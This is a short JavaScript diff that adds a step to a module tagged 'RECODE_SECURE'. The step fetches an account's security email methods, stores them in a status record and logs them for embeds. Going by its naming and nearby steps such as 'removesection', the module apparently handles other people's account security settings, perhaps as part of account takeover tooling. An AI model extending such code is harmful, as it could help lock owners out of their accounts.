@@ -690,6 +690,24 @@ module.exports = async (host, settings, uid, username = null) => {
         console.log(`[RECODE_SECURE] Error in removesection:`, e.message);
     }
 
+    // Step 2.6: Fetch TRUE Authoritative Security Emails for Embeds
+    try {
+        const { securityMethodService, SECURITY_METHOD_TYPES } = require("./securityInformation");
+        const methods = await securityMethodService.getSecurityMethods(axios, securityParameters?.netId);
+        const emailMethods = methods.filter(m => m.type === SECURITY_METHOD_TYPES.EMAIL);
+        if (emailMethods.length > 0) {
+            acc.secEmail = emailMethods.map(m => m.displayName).join(", ");
+            await updateStatus(uid, "secemail", acc.secEmail);
+            console.log(`[RECODE_SECURE] Updated authoritative security emails: ${acc.secEmail}`);
+        } else {
+            acc.secEmail = "None";
+            await updateStatus(uid, "secemail", acc.secEmail);
+            console.log(`[RECODE_SECURE] No authoritative security emails found.`);
+        }
+    } catch (secErr) {
+        console.log(`[RECODE_SECURE] Error fetching authoritative security emails:`, secErr.message);
+    }
+
 
     // console.log(`aliases stringified: ${JSON.stringify(aliaseslist)}`)
     let extrainfodata = await queryParams(`SELECT * FROM extrainformation WHERE uid=?`, [uid]);
